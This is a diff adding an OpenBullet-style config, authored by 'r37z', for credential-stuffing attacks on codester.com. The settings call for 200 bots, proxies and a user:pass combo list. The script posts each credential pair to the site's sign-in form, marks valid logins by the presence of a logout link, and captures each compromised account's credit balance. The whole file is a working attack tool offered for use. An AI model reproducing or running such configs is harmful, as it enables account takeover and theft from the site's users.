@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "codester.com",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-16T12:32:26.6004324+02:00",
+  "AdditionalInfo": "",
+  "Author": "r37z",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.codester.com/sign_in/" 
+  CONTENT "username=<USER>&password=<PASS>&rememberme=1&login=yes&login=yes" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.codester.com" 
+  HEADER "Origin: https://www.codester.com" 
+  HEADER "Referer: https://www.codester.com/sign_in/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<a href=\"/users/logout/\">" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+
+REQUEST GET "https://www.codester.com/" 
+  
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.codester.com" 
+  HEADER "Referer: https://www.codester.com/sign_in/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "<p>Credit balance: " "</p>" -> VAR "cb" 
+
+PARSE "<cb>" LR "<strong>" "</strong>" -> CAP "" "Credit Balance " "" 
+
